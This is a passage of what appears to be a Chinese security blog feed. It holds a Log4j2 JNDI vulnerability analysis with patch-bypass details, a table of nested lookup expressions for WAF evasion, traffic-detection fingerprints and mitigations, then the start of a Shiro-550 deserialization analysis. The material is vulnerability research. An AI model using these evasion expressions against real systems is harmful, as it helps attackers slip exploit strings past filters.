title="分析"></a>分析</h3><p>通过一样的PoC，一直进入到MessagePatternConverter，这里发生了变化，原来的MessagePatternConverter.format全部通过新分配的XXXConverter.format实现，由于配置了lookup选项，所以交由<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter.LookupMessagePatternConverter#format</code>进行格式化（原来的MessagePatternConverter.format的修改也导致无法通过自定义factory进行绕过的风险</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">format</span><span class="token punctuation">(</span><span class="token keyword">final</span> LogEvent event<span class="token punctuation">,</span> <span class="token keyword">final</span> StringBuilder toAppendTo<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> start <span class="token operator">=</span> toAppendTo<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    delegate<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> toAppendTo<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> indexOfSubstitution <span class="token operator">=</span> toAppendTo<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"${"</span><span class="token punctuation">,</span> start<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>indexOfSubstitution <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        config<span class="token punctuation">.</span><span class="token function">getStrSubstitutor</span><span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token punctuation">.</span><span class="token function">replaceIn</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span> toAppendTo<span class="token punctuation">,</span> indexOfSubstitution<span class="token punctuation">,</span> toAppendTo<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> indexOfSubstitution<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>最终一路进入到，可以看到如果想要触发异常，需要<code>URI(name)</code>异常，这里就很好操作了（坏字符、空格…</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">synchronized</span> <span class="token operator">&lt;</span>T<span class="token operator">></span> T <span class="token function">lookup</span><span class="token punctuation">(</span><span class="token keyword">final</span> String name<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        URI uri <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URI</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>uri<span class="token punctuation">.</span><span class="token function">getScheme</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">URISyntaxException</span> ex<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// This is OK.</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>T<span class="token punctuation">)</span> <span class="token keyword">this</span><span class="token punctuation">.</span>context<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="关于触发条件"><a href="#关于触发条件" class="headerlink" title="关于触发条件"></a>关于触发条件</h2><h3 id="lt-2-15-0-rc1"><a href="#lt-2-15-0-rc1" class="headerlink" title="&lt; 2.15.0-rc1"></a>&lt; 2.15.0-rc1</h3><p>在<code>org.apache.logging.log4j.core.pattern.PatternParser#finalizeConverter</code></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/2a3f499fe1f44d88a6c9ff825232bc6d.png" alt="2a3f499fe1f44d88a6c9ff825232bc6d"></p><p>很明显，需要进入到<code>org.apache.logging.log4j.core.pattern.MessagePatternConverter#MessagePatternConverter</code>这个类需要有特征转换标记<code>%m %msg %message</code>之一，转换标记在各个Converter中通过修饰符定义</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/e99ceba45b5f4d52b932574d174ff07d.png" alt="e99ceba45b5f4d52b932574d174ff07d"></p><p>而默认在 <code>org.apache.logging.log4j.core.config.DefaultConfiguration#DEFAULT_PATTERN</code><br>定义有</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> String DEFAULT_PATTERN <span class="token operator">=</span> <span class="token string">"%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n"</span><span class="token punctuation">;</span></code></pre><p>当然如果开发自己写有配置文档，但是不带特征标记，也无法触发（但是谁会不记录msg呢？</p><h3 id="gt-2-15-0-rc1"><a href="#gt-2-15-0-rc1" class="headerlink" title="&gt;= 2.15.0-rc1"></a>&gt;= 2.15.0-rc1</h3><p>根据 <code>LOG4J2-3198 - Log4j2 no longer formats lookups in messages by default</code> 中的修改内容可以看到，启用lookup需要在占位符后添加<code>{lookups}</code>声明（选项）才可执行lookup解析</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/cf1ca4fd61824f459280a9acfd0825e1.png" alt="cf1ca4fd61824f459280a9acfd0825e1"></p><p>所以需要配置类似有</p><pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PatternLayout</span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>%d{HH:mm:ss} %msg{lookups}%n<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></code></pre><h2 id="Waf-Bypass"><a href="#Waf-Bypass" class="headerlink" title="Waf Bypass"></a>Waf Bypass</h2><h3 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h3><p>表达式解析主要使用以下三个函数，通过深度遍历，解析所有存在的表达式</p><ul><li>org.apache.logging.log4j.core.pattern.MessagePatternConverter#format</li><li>org.apache.logging.log4j.core.lookup.StrSubstitutor#substitute(org.apache.logging.log4j.core.LogEvent, java.lang.StringBuilder, int, int, java.util.List&lt;java.lang.String&gt;)</li><li>org.apache.logging.log4j.core.lookup.Interpolator#lookup</li></ul><p>代码比较长，做了个解析流程图</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/map_new.png" alt="map"></p><p>举几个例子方便理解流程和结果</p><table><thead><tr><th align="left">表达式</th><th align="left">解析流程</th><th align="center">是否替换</th><th align="center">结果</th></tr></thead><tbody><tr><td align="left"><code>${:-}</code></td><td align="left">1-2-4-6-7-8</td><td align="center">√</td><td align="center">空字符串</td></tr><tr><td align="left"><code>${::}</code></td><td align="left">1-3-4-6-7</td><td align="center">×</td><td align="center"></td></tr><tr><td align="left"><code>${lower:d}</code></td><td align="left">1-3-4-5-8</td><td align="center">√</td><td align="center">d</td></tr><tr><td align="left"><code>${clower:d}</code></td><td align="left">1-3-4-6-7</td><td align="center">×</td><td align="center"></td></tr><tr><td align="left"><code>${clower:hostName}</code></td><td align="left">1-3-4-6-8</td><td align="center">√</td><td align="center">本地 hostname</td></tr><tr><td align="left"><code>${c:d:lower:d}</code></td><td align="left">1-3-4-6-7</td><td align="center">×</td><td align="center"></td></tr><tr><td align="left"><code>${c:d:lower:-d}</code></td><td align="left">1-2-4-6-7-8</td><td align="center">√</td><td align="center">d</td></tr><tr><td align="left"><code>${lower:${:-D}}</code></td><td align="left">1-1-2-4-6-7-8-3-4-5-8</td><td align="center">√</td><td align="center">d</td></tr></tbody></table><h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>这里只说纯表达式字符串在流量中的指纹匹配，初步就是检测<code>${j</code>、<code>${$</code>是否存在，解码获取完整内容匹配 jndi头、domain 信息等内容</p><h2 id="修补方案"><a href="#修补方案" class="headerlink" title="修补方案"></a>修补方案</h2><h3 id="标准方案"><a href="#标准方案" class="headerlink" title="标准方案"></a>标准方案</h3><ol><li>设置<code>log4j2.formatMsgNoLookups=True</code><ul><li>在 &lt;2.15.0-rc1 之前，使用自定义factory实际有很大隐患，可能导致绕过</li></ul></li><li>升级至<code>2.15.0-rc2</code>即<code>2.15.0</code><ul><li>可能需要升级JDK</li></ul></li></ol><h3 id="非标准方案"><a href="#非标准方案" class="headerlink" title="非标准方案"></a>非标准方案</h3><h4 id="PLUGIN-CACHE-FILE"><a href="#PLUGIN-CACHE-FILE" class="headerlink" title="PLUGIN_CACHE_FILE"></a>PLUGIN_CACHE_FILE</h4><p><strong>首先直接上结论：删除<code>META-INF/org/apache/logging/log4j/core/config/plugins/Log4j2Plugins.dat</code>里对应JNDI字符串即可</strong></p><p>通过上面知道strLookupMap中存有允许的前缀及对应处理类，而其在<code>org.apache.logging.log4j.core.lookup.Interpolator#Interpolator</code>中初始化有（看起来是这里</p><pre class=" language-java"><code class="language-java"><span class="token keyword">try</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// [LOG4J2-703] We might be on Android</span>    strLookupMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>LOOKUP_KEY_JNDI<span class="token punctuation">,</span>        Loader<span class="token punctuation">.</span><span class="token function">newCheckedInstanceOf</span><span class="token punctuation">(</span><span class="token string">"org.apache.logging.log4j.core.lookup.JndiLookup"</span><span class="token punctuation">,</span> StrLookup<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">final</span> LinkageError <span class="token operator">|</span> Exception e<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">handleError</span><span class="token punctuation">(</span>LOOKUP_KEY_JNDI<span class="token punctuation">,</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>而在<code>org.apache.logging.log4j.core.config.AbstractConfiguration</code> 初始化有</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> StrLookup tempLookup <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Interpolator</span><span class="token punctuation">(</span>propertyMap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">final</span> StrSubstitutor subst <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StrSubstitutor</span><span class="token punctuation">(</span>tempLookup<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>而实际最后是在这里填充可处理对象</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/08c804856ef5414497721122dd3b1cd3.png" alt="08c804856ef5414497721122dd3b1cd3"></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setVariableResolver</span><span class="token punctuation">(</span><span class="token keyword">final</span> StrLookup variableResolver<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>variableResolver <span class="token keyword">instanceof</span> <span class="token class-name">ConfigurationAware</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>configuration <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span>ConfigurationAware<span class="token punctuation">)</span> variableResolver<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setConfiguration</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>configuration<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>variableResolver <span class="token operator">=</span> variableResolver<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>而configuration最终通过<code>org.apache.logging.log4j.core.config.plugins.util.PluginRegistry#decodeCacheFiles</code>缓存文件获取加载类</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/9e42d867/d7273e6a7ae448deb7e99d27b7d8f425.png" alt="d7273e6a7ae448deb7e99d27b7d8f425"></p><p>所以删除<code>META-INF/org/apache/logging/log4j/core/config/plugins/Log4j2Plugins.dat</code>里对应JNDI字符串即可</p><h4 id="其他魔法"><a href="#其他魔法" class="headerlink" title="其他魔法"></a>其他魔法</h4><p>各种临时性的hook或者卸载对甲方来说并不实用，在此不表</p><h2 id="官方GIT时间线"><a href="#官方GIT时间线" class="headerlink" title="官方GIT时间线"></a>官方GIT时间线</h2><table><thead><tr><th>时间</th><th>行为</th><th>链接</th></tr></thead><tbody><tr><td>2021年12月5日 GMT+8 下午12:00</td><td>限制JNDI</td><td><a href="https://github.com/apache/logging-log4j2/commit/d82b47c6fae9c15fcb183170394d5f1a01ac02d3" target="_blank" rel="noopener">LOG4J2-3201 - Limit the protocols JNDI can use by default. Limit the servers and classes that can be accessed via LDAP.</a></td></tr><tr><td>2021年12月5日 GMT+8 下午3:20</td><td>默认nolookup</td><td><a href="https://github.com/apache/logging-log4j2/commit/04637dd9102175f765cfad349de0c2a63c279ac3" target="_blank" rel="noopener">LOG4J2-3198 - Log4j2 no longer formats lookups in messages by default</a></td></tr><tr><td>2021年12月10日 GMT+8 上午2:18</td><td>修复rc1异常绕过</td><td><a href="https://github.com/apache/logging-log4j2/commit/c2b07e37995004555c211cdf0bb169d6a6a6f96b" target="_blank" rel="noopener">Handle URI exception</a></td></tr><tr><td>2021年12月12日 GMT+8 上午7:05</td><td>默认禁用JNDI</td><td><a href="https://github.com/apache/logging-log4j2/commit/44569090f1cf1e92c711fb96dfd18cd7dccc72ea" target="_blank" rel="noopener">LOG4J2-3208 - Disable JNDI by default</a></td></tr><tr><td>2021年12月13日 GMT+8 下午1:32</td><td>删除Message Lookups</td><td><a href="https://github.com/apache/logging-log4j2/commit/27972043b76c9645476f561c5adc483dec6d3f5d" target="_blank" rel="noopener">LOG4J2-3211 - Remove Messge Lookups</a> <br>(开发急的…英文都打错了)</td></tr></tbody></table><h3 id="附言说说1-x版本"><a href="#附言说说1-x版本" class="headerlink" title="附言说说1.x版本"></a>附言说说1.x版本</h3><p>看有说要注意 log4j 一代可能也有安全问题，翻了下源码感觉实在没什么可说的，这么显式的lookup下还能出问题，纯属开发背锅</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好久没更新博客了~&lt;/p&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>🔐</title>
    <link href="https://blog.sari3l.com/posts/9a92d107/"/>
    <id>https://blog.sari3l.com/posts/9a92d107/</id>
    <published>2020-09-15T03:04:12.000Z</published>
    <updated>2020-11-12T08:01:09.266Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="1236bf82c99be734d4ff3969540b68e7293bcd969d49f0a21cb83d895b2ed1f6"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      应厂商需求加🔐，待合适时间重新开放，请勿二次外泄
    
    </summary>
    
    
    
      <category term="hw2020" scheme="https://blog.sari3l.com/tags/hw2020/"/>
    
      <category term="深信服" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
  </entry>
  
  <entry>
    <title>🔐</title>
    <link href="https://blog.sari3l.com/posts/fd03bf87/"/>
    <id>https://blog.sari3l.com/posts/fd03bf87/</id>
    <published>2020-09-14T16:09:16.000Z</published>
    <updated>2020-09-17T07:15:24.359Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="23c5e0d4e453963c2c11c702672daba0ef7eb50529d8396087d58ff8c2990103">8a6b57f33d1755f3d4ced00d3b81eb6dc3140cc81887cec2f8c303885531160ffa42fe8bcc83ac4e6789711f3c5c8dca7b65f880f5db69d847e7e9a22881eb23cddd6a6723a5e26be409e55cf2ac624d8204e83bb1e1618bca1d9bb98e8307a032f5e1af32089d37d35f9c5fb23d68a73bce20e3fff110946861bc3c2c8d26c5ed18b76d425486cb8be2f8b04862bf973dc7b190e5a76dd3e5c6b2fb1e4ba34b15ea90719526b87d5a3d98fbfd5b2d0b6e3bdac0c7ad67819a3b6e78d4ae8c5a25b0facd90fd04ab361b913e58fd844b3ca910d0846ccd22586e2c1f806df5330b65832e6f65377f404f4b5af1e665969a80bdd1d65711389ff71668f0e36d25dfdffba0309adb20234a50af43e2102f3387320be966db2e3ea28866fcde4205e3672760588131902cc7944b17a2f553fddfc3c85152d8f68aac013406d8eb7cd3a052616a2fc58afe04dd1f7b085f9416570b5f70d6adfb1ade88110dc8998fde596b7ca35ef35f4af0cc6e0cb70f5fac615ba3550cdc97c1885764f3935edcdeeffe0664fa04692f56eeb30e4bd3529d6844bd9ad952254f30a742b2e1dd93daa8e946b87c80b31500ec3fcb48323e99a99cf8d39a1672fed82cf2f50ba32017f7f0c459105612e7a4f07442455c0ed2a8e9029edd1a3cf8ab92fe93e3ca83e37aafa9419197ebe93c319a9c446e07d20403cea855bd0bdafbfa20d1f564e9e9e0adec96944430f50d83da2f34e93fab3e951829c60c648594be0d978c831ace9363a1feb6a919ba5fded83ae7ef732be86ca97b183c19f6351904735222c3e69a83850f33b9d5ffb5447c0a7d802cfab5e12a3ce06fa2040dc0e7d6d1636be7cda00b7249a4073ef3808fa0adb93823f389892b216f26cc2cb4a99ae6358441b147431f638d11302b0fe49d32adf3e48b70c5e096f359c2bdd745d829ecd737618c341110852639c839913c749aa914296b9566cbaffb2de1042cad1fe9eabbe9c5ffc58a96151e0d653dc9db7465cc58fa767531ef3d0d053b7209065d9b55c9699f6d8af62e554481970f8bf8af011b5c830e51222649ebe159462de2ed287c0bf913b996d19c2ebee43b6e849eb28644d3f560692b567db3a03d72da5f546c951ceadd52b3589530b31a4fa772022d93fbd1da0a6017e42fd6db0d69326088eec169d5b0eb55232e03a0fdb584aa7164758a40b6761414a05529c2c663d99d2710b3b1d20b77e2456ab89253031ad2b4fc5f8e4bd576f4cde063f839aa905fe8887e78e6fdaac6f9dc7ba395ceed831ddc26f90315091815251d64b9b3cf05c3d8d3568fb00bbd8e3de3cca5c095438f89311847a4e640e47ef8cfda184792fcc7bfd4d8cc9ca171088c739ef87cdf14331efafede4b1ef04f39c5f5a88795e3e661e8549479161d0b21f15aa213da397edb7a9ef83bb09d7ce6af8ff47ab3f1d0a47aec7feed704ad81b126872cae84ecd39f2f079be127698fbe06e4b45b562b1c580d64612b022d31604c83d47fbe571afe4116c995a7d220f65053b265c556be7400f903b8765ce21fe31ac5b8a7b9aaae284a58d774b27348cd885a1fff3ea1117eb9f9cf0adffefffff5c928b98aedaaf6a7674e6fcbf3294a9e2ef66bda592fdd2bb752b275943e5aefbf421d05c85c585f2ae6304d64153d6efa181eb72c28cf3864a6bb31b01f77a019c95349a88d204e918fb0f7d9fa3af173b255b2c5a49f9eddf0422879f0740b81fcb14535d7b346091fd5bb3610313cc012c3f4aeef519a960f21edd308254f36d31a452d5551df53841bd28a0bdff69249701ae60a459b8077dafa59571c95d88dcb720808a3295cda060ef4d294a3859473218c792e910d4e9753555b09fe1b6c939936d8b231c511df284b645db03784ea40897cd1227f3e169ac3f4abef</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      应厂商需求加🔐，待合适时间重新开放，请勿二次外泄
    
    </summary>
    
    
    
      <category term="hw2020" scheme="https://blog.sari3l.com/tags/hw2020/"/>
    
      <category term="深信服" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
  </entry>
  
  <entry>
    <title>🔐</title>
    <link href="https://blog.sari3l.com/posts/df08045a/"/>
    <id>https://blog.sari3l.com/posts/df08045a/</id>
    <published>2020-09-12T14:02:11.000Z</published>
    <updated>2020-09-29T14:20:19.760Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="dbce67b819d81bceca5d694f780c50b2a80b8d78c10cec60150e4fbbbbc17fc8"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      🔐 uid=0(root) gid=0(root) groups=0(root)
    
    </summary>
    
    
    
      <category term="深信服" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
      <category term="Nday" scheme="https://blog.sari3l.com/tags/Nday/"/>
    
  </entry>
  
  <entry>
    <title>🔐</title>
    <link href="https://blog.sari3l.com/posts/787c7e6c/"/>
    <id>https://blog.sari3l.com/posts/787c7e6c/</id>
    <published>2020-08-26T06:34:17.000Z</published>
    <updated>2020-09-29T14:20:28.155Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="652acec38244f67b4aaa3b82d8cf5a55ce8fb52a936b27c4efb9e5e4483fc3d8"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      🔐 内部分享
    
    </summary>
    
    
    
      <category term="深信服" scheme="https://blog.sari3l.com/tags/%E6%B7%B1%E4%BF%A1%E6%9C%8D/"/>
    
      <category term="Nday" scheme="https://blog.sari3l.com/tags/Nday/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-055 分析&amp;回显</title>
    <link href="https://blog.sari3l.com/posts/55ea3bd4/"/>
    <id>https://blog.sari3l.com/posts/55ea3bd4/</id>
    <published>2020-08-23T05:06:09.000Z</published>
    <updated>2020-08-23T05:10:03.779Z</updated>
    
    <content type="html"><![CDATA[<h2 id="I-准备"><a href="#I-准备" class="headerlink" title="I. 准备"></a>I. 准备</h2><p>使用 docker hub 已有的漏洞环境，IDEA 配置 Remote Debug</p><pre class=" language-shell"><code class="language-shell">> docker pull medicean/vulapps:s_shiro_1> docker run -d -p 8080:8080 -p 8090:8090 --env JAVA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,address=8090,server=y,suspend=n" medicean/vulapps:s_shiro_1</code></pre><p>拉取源码</p><pre class=" language-shell"><code class="language-shell">> git clone https://github.com/apache/shiro.git> git checkout shiro-root-1.2.4</code></pre><h2 id="II-漏洞原理"><a href="#II-漏洞原理" class="headerlink" title="II. 漏洞原理"></a>II. 漏洞原理</h2><p>原因是因为在 org.apache.shiro.mgt.AbstractRememberMeManager 中有定义以下内容，导致攻击者利用默认密码实现反序列化RCE</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975905440609.jpg" alt="-w588"></p><ol><li><p>序列化对象需要继承 PrincipalCollection (实际非必须，下文有解释)</p></li><li><p>设置加密方式为 AES/CBC/PKCS5Padding，具体可在org.apache.shiro.crypto.DefaultBlockCipherService#DefaultBlockCipherService中查看</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978155103697.jpg" alt="-w696"></p></li><li><p>硬编码默认加密密钥 DEFAULT_CIPHER_KEY_BYTES</p><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975752216803.jpg" alt="-w888"></p></li></ol><h3 id="加密cookie"><a href="#加密cookie" class="headerlink" title="加密cookie"></a>加密cookie</h3><p>当用户登陆成功并且选择rememberme的时候，会进入org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin 保存新的验证信息</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975913577431.jpg" alt="-w843"></p><p>接着在rememberIdentity函数中，先通过getIdentityToRemember获取到用户标志信息</p><blockquote><p>Returns all principals associated with the corresponding Subject. Each principal is an identifying piece of information useful to the application such as a username, or user id, a given name, etc - anything useful to the application to identify the current Subject.</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975918939762.jpg" alt="-w844"></p><p>再进入同名方法rememberIdentity中，这里首先通过convertPrincipalsToBytes将用户信息转换成 byte 数组，后进行保存</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975921483867.jpg" alt="-w744"></p><p>我们来看convertPrincipalsToBytes，先进行序列化后再进行加密，我们重点关注加密算法</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15975917689368.jpg" alt="-w680"></p><p>在 org.apache.shiro.mgt.AbstractRememberMeManager#encrypt 中调用 AES 类进行加密</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978076688353.jpg" alt="-w755"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978156691340.jpg" alt="-w423"></p><p>实际是调用<code>org.apache.shiro.crypto.JcaCipherService#encrypt(byte[], byte[])</code>和<code>encrypt(byte[], byte[], byte[], boolean)</code>，可以看到在最后是把 iv 放在 crypt 加密后的数据内容前，再整体返回</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978160744231.jpg" alt="-w914"></p><p>最后进入org.apache.shiro.web.mgt.CookieRememberMeManager#rememberSerializedIdentity，对信息 base64编码后存放入 cookie</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978164894987.jpg" alt="-w917"></p><h3 id="解密cookie"><a href="#解密cookie" class="headerlink" title="解密cookie"></a>解密cookie</h3><p>当用户携带 rememberMe cookie 进行访问时，会进入org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978175616743.jpg" alt="-w698"></p><p>调用子类CookieRememberMeManager#getRememberedSerializedIdentity提取 cookie，首先判断非 deleteMe 且进行 base64 尾部检测填充后，返回有效 cookie 回到 AbstractRememberMeManager</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978177704065.jpg" alt="-w902"></p><p>之后在org.apache.shiro.mgt.AbstractRememberMeManager#convertBytesToPrincipals中，尝试解密和反序列化</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978178067478.jpg" alt="-w817"></p><p>解密位于org.apache.shiro.mgt.AbstractRememberMeManager#decrypt</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978178548281.jpg" alt="-w772"></p><p>最后由org.apache.shiro.crypto.JcaCipherService#decrypt(byte[], byte[])和decrypt(byte[], byte[], byte[])实现解密，整个流程都很常规，主要关注是从 cookie 头16位字节数据为 iv</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/55ea3bd4/15978180179924.jpg" alt="-w914"></p><h2 id="III-漏洞检测"><a href="#III-漏洞检测" class="headerlink" title="III. 漏洞检测"></a>III. 漏洞检测</h2><h3 id="1-无效rememberMe"><a href="#1-无效rememberMe" class="headerlink" title="1. 无效rememberMe"></a>1. 无效rememberMe</h3><p>只能快速判断是否使用 shiro</p><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>当我们输入一个无效的 rememberMe cookie 时会因无法解密或反序列化触发异常进入org.apache.shiro.mgt.AbstractRememberMeManager#onRememberedPrincipalFailure</p><p><img 